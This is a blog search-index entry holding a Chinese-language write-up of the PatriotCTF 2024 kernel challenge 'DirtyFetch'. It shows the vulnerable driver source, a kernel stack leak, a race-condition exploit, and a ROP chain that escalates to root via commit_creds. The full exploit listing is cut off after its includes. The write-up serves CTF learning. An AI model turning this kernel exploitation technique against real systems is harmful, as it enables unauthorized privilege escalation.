<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PatriotCTF 2024 WP</title>
    <link href="/2024/09/24/PatriotCTF-2024-WP/"/>
    <url>/2024/09/24/PatriotCTF-2024-WP/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="DirtyFetch"><a href="#DirtyFetch" class="headerlink" title="DirtyFetch"></a>DirtyFetch</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p>给了驱动源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/proc_fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/slab.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/uaccess.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 240</span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> max;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span>&#123;</span><br><span class="hljs-type">char</span> * content;<br>    <span class="hljs-type">size_t</span> length;<br>&#125;data;<br>data * storage;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">device_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode* inode, <span class="hljs-keyword">struct</span> file* filp)</span> &#123;<br>    printk(KERN_ALERT <span class="hljs-string">&quot;Opened.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">device_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode* inode, <span class="hljs-keyword">struct</span> file* filp)</span> &#123;<br>    <span class="hljs-keyword">if</span>(storage != <span class="hljs-number">0</span>)&#123;<br>        kfree(storage-&gt;content);<br>        kfree(storage);<br>    &#125;<br>    printk(KERN_ALERT <span class="hljs-string">&quot;Closed.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">device_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file* filp, <span class="hljs-type">char</span>* buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span>* off)</span> &#123;<br>    printk(KERN_ALERT <span class="hljs-string">&quot;Unimplemented!&quot;</span>);<br>    <span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">device_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file* filp, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span>* off)</span> &#123;<br>    printk(KERN_ALERT <span class="hljs-string">&quot;Unimplemented!&quot;</span>);<br>    <span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br>data * <span class="hljs-title function_">get_storage_contents</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buf)</span>&#123;<br>    data * request = (data *)kmalloc(<span class="hljs-keyword">sizeof</span>(data),GFP_KERNEL);<br>    <span class="hljs-keyword">if</span>(request == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    copy_from_user(request, (data *)buf, <span class="hljs-keyword">sizeof</span>(data));<br>    <span class="hljs-type">char</span> * content = (<span class="hljs-type">char</span> *)kmalloc((request-&gt;length),GFP_KERNEL);<br>    <span class="hljs-keyword">if</span>(content == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    copy_from_user(content,request-&gt;content,request-&gt;length);<br>    <span class="hljs-built_in">memcpy</span>(request, &amp;content, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">return</span> request;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">validate_buf</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buf)</span>&#123;<br>    data * request = get_storage_contents(buf);<br>    <span class="hljs-keyword">if</span>(request == <span class="hljs-literal">NULL</span>)&#123;<br>        printk(KERN_ALERT <span class="hljs-string">&quot;Error fetching storage from userspace!&quot;</span>);<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br>    <span class="hljs-type">int</span> ret = request-&gt;length &lt; MAX_SIZE;<br>    kfree(request-&gt;content);<br>    kfree(request);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">edit_storage</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buf)</span> &#123;<br>    data * request;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-keyword">if</span>(validate_buf(buf))&#123;<br>        request = get_storage_contents(buf);<br>        storage = request;<br>        ret = request-&gt;length;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        request = <span class="hljs-literal">NULL</span>;<br>        printk(KERN_ALERT <span class="hljs-string">&quot;Specified size goes out of bounds.&quot;</span>);<br>        ret = -EFAULT;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">device_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file* filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ioctl_num, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ioctl_param)</span> &#123;<br>    <span class="hljs-type">long</span> ret = -EINVAL;<br>    <span class="hljs-type">char</span> content[MAX_SIZE];<br><br>    <span class="hljs-keyword">switch</span>(ioctl_num)&#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x10</span>:<br>            <span class="hljs-keyword">if</span>(ioctl_param &gt; <span class="hljs-number">0</span>)&#123;<br>                max = ioctl_param;<br>                ret = ioctl_param;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                printk(KERN_ALERT <span class="hljs-string">&quot;Invalid max&quot;</span>);<br>                ret = -EINVAL;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x20</span>:<br>            <span class="hljs-keyword">if</span>(storage != <span class="hljs-number">0</span>)&#123;<br>                kfree(storage-&gt;content);<br>                kfree(storage);<br>                storage = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-type">ssize_t</span> request = edit_storage(ioctl_param);<br>            <span class="hljs-keyword">if</span>(request == -EFAULT)&#123;<br>                printk(KERN_ALERT <span class="hljs-string">&quot;Error copying userspace data!&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                printk(KERN_ALERT <span class="hljs-string">&quot;Data copied!&quot;</span>);<br>            &#125;<br>            ret = (<span class="hljs-type">long</span>) request;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x30</span>:<br>            <span class="hljs-keyword">if</span>(storage == <span class="hljs-number">0</span>)&#123;<br>                printk(KERN_ALERT <span class="hljs-string">&quot;Nothing to save!&quot;</span>);<br>                ret = -EINVAL;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">memcpy</span>(content,storage-&gt;content,storage-&gt;length);<br>                ret = storage-&gt;length;<br>                printk(KERN_ALERT <span class="hljs-string">&quot;Data saved!&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x40</span>:<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len;<br>            <span class="hljs-keyword">if</span>(get_user(len, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)ioctl_param) == -EFAULT)&#123;<br>                printk(KERN_ALERT <span class="hljs-string">&quot;Error fetching length!&quot;</span>);<br>                ret = -EFAULT;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(copy_to_user((<span class="hljs-type">char</span> *)ioctl_param, content, len % max) != <span class="hljs-number">0</span>)&#123;<br>                printk(KERN_ALERT <span class="hljs-string">&quot;Error reading data!&quot;</span>);<br>                ret = -EFAULT;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(ret != -EFAULT)&#123;<br>                ret = len % max;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            printk(KERN_ALERT <span class="hljs-string">&quot;Invalid command&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">fops</span> =</span> &#123;<br>    .read = device_read,<br>    .write = device_write,<br>    .unlocked_ioctl = device_ioctl,<br>    .open = device_open,<br>    .release = device_release&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_dir_entry</span>* <span class="hljs-title">proc_entry</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">init_module</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    max = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)MAX_SIZE;<br>    storage = <span class="hljs-number">0</span>;<br>    proc_entry = proc_create(<span class="hljs-string">&quot;vuln&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;fops);<br>    printk(KERN_ALERT <span class="hljs-string">&quot;Challenge loaded at /proc/vuln, good luck!!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">cleanup_module</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (proc_entry) &#123;<br>        proc_remove(proc_entry);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h4><ul><li>ioctl 0x10可以改写全局变量max的值，该值会在ioctl 0x40用到</li><li>ioctl 0x20会申请堆块然后向内写入数据</li><li>ioctl 0x30可以将写入堆块内部的内容copy到栈内</li><li>ioctl 0x40可以将栈内数据传回用户态</li></ul><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><h4 id="越界读"><a href="#越界读" class="headerlink" title="越界读"></a>越界读</h4><p>ioctl 0x10可以修改max变量的值，然而0x40处的<code>copy_to_user</code>的第三个参数又max控制，因此可以泄露容易长度的内核栈数据。</p><h4 id="越界写"><a href="#越界写" class="headerlink" title="越界写"></a>越界写</h4><p>ioctl 0x20申请堆块后，写入操作会执行两次，首先<code>validate_buf</code>会调用<code>get_storage_contents</code>写入数据，然后检查数据长度是否小于240，如果小于则返回True，然后<code>edit_storage</code>检查<code>validate_buf</code>的返回值，如果为True则进行第二次写入。<br>上述操作可以通过条件竞争改写第二次写入的长度，从而绕过<code>validate_buf</code>的长度监测。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>首先利用oobRead泄露Canary和内核地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> fd;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> *content;<br>    <span class="hljs-type">size_t</span> length;<br>&#125; data;<br>data storage;<br><span class="hljs-type">long</span> <span class="hljs-title function_">Setmax</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, <span class="hljs-number">0x10</span>, size);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">Leak</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> length)</span><br>&#123;<br><br>    storage.content = buf;<br>    storage.length = length;<br>    <span class="hljs-keyword">return</span> ioctl(fd, <span class="hljs-number">0x40</span>, buf);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br>    fd = open(<span class="hljs-string">&quot;/proc/vuln&quot;</span>, O_RDWR);<br><br>    <span class="hljs-keyword">if</span> (Setmax(<span class="hljs-number">0x200</span>) != <span class="hljs-number">0x200</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Set max failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Set max success&quot;</span>);<br>    buffer[<span class="hljs-number">0</span>] = <span class="hljs-number">240</span>;<br>    <span class="hljs-keyword">if</span> (!Leak(buffer, <span class="hljs-number">0xe8</span>))<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Leak failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Leak success&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> kernel_leak = buffer[<span class="hljs-number">29</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> kernel_base = kernel_leak - <span class="hljs-number">0x35691f</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> canary = buffer[<span class="hljs-number">22</span>];<br>    <span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode = kernel_base + <span class="hljs-number">0xc00a2f</span>;<br>    <span class="hljs-type">size_t</span> prepare_kernel_cred = kernel_base + <span class="hljs-number">0x895e0</span>;<br>    <span class="hljs-type">size_t</span> commit_creds = kernel_base + <span class="hljs-number">0x892c0</span>;<br>    <span class="hljs-type">size_t</span> pop_rdi_ret = kernel_base + <span class="hljs-number">0x2c3a</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel leak      : %p\n&quot;</span>, kernel_leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel base      : %p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;canary           : %p\n&quot;</span>, canary);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>然后通过条件竞争写入长度超过240的数据到堆内</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> is_running = <span class="hljs-number">1</span>;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> length)</span><br>&#123;<br>    storage.content = buf;<br>    storage.length = length;<br>    <span class="hljs-keyword">return</span> ioctl(fd, <span class="hljs-number">0x20</span>, &amp;storage);<br>&#125;<br><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">ThreadWriteData</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Start Write Data&quot;</span>);<br>    <span class="hljs-keyword">while</span> (is_running)<br>    &#123;<br>        <span class="hljs-type">size_t</span> ret = Add(buffer1, <span class="hljs-number">100</span>);<br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0x200</span>)<br>        &#123;<br>            is_running = <span class="hljs-number">0</span>;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Win race condition&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">ThreadChangeLength</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Start Write Data&quot;</span>);<br>    <span class="hljs-keyword">while</span> (is_running)<br>    &#123;<br>        storage.length = <span class="hljs-number">0x200</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br>    fd = open(<span class="hljs-string">&quot;/proc/vuln&quot;</span>, O_RDWR);<br><br>    <span class="hljs-type">pthread_t</span> tChangeLength;<br>    <span class="hljs-type">pthread_t</span> tWriteData;<br><br>    pthread_create(&amp;tChangeLength, <span class="hljs-literal">NULL</span>, ThreadChangeLength, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;tWriteData, <span class="hljs-literal">NULL</span>, ThreadWriteData, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(tChangeLength, <span class="hljs-literal">NULL</span>);<br>    pthread_join(tWriteData, <span class="hljs-literal">NULL</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>现在我们可以得到长度超过240的堆块了，通过ioctl 0x40将堆内数据copy到栈内就可以造成栈溢出，完成ROP。</p><p>ROP_Chain如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> idx = <span class="hljs-number">0x1e</span>;<br>buffer1[idx++] = canary;<br>idx++;<br>idx++;<br>idx++;<br>buffer1[idx++] = pop_rdi_ret;<br>buffer1[idx++] = <span class="hljs-number">0</span>;<br>buffer1[idx++] = prepare_kernel_cred;<br>buffer1[idx++] = commit_creds;<br>buffer1[idx++] = swapgs_restore_regs_and_return_to_usermode + <span class="hljs-number">22</span>;<br>buffer1[idx++] = <span class="hljs-number">0</span>;<br>buffer1[idx++] = <span class="hljs-number">0</span>;<br>buffer1[idx++] = backdoor;<br>buffer1[idx++] = user_cs;<br>buffer1[idx++] = user_rflags;<br>buffer1[idx++] = user_sp;<br>buffer1[idx++] = user_ss;<br></code></pre></td></tr></table></figure><h3 id="完整Exp"><a href="#完整Exp" class="headerlink" title="完整Exp"></a>完整Exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>      <span class="hljs-comment">// printf, puts</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>     <span class="hljs-comment">// system</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>     <span class="hljs-comment">// memset</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>     <span class="hljs-comment">// open</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span>      <span class="hljs-comment">// O_RDWR</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 